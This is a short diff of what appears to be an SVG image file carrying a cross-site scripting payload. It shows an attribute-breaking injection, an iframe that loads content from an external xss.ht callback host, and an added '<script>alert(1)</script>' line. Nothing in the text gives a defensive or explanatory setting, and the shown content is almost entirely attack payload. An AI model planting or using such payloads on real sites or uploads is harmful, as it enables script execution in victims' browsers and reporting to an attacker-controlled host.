@@ -5,4 +5,5 @@
    <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
    ">
 <iframe sandbox="allow-same-origin allow-scripts allow-popups allow-forms" src="http://abcd12344321.xss.ht/getusercontent.cgi?id=12193"></iframe>
+<script>alert(1)</script>
 </svg>
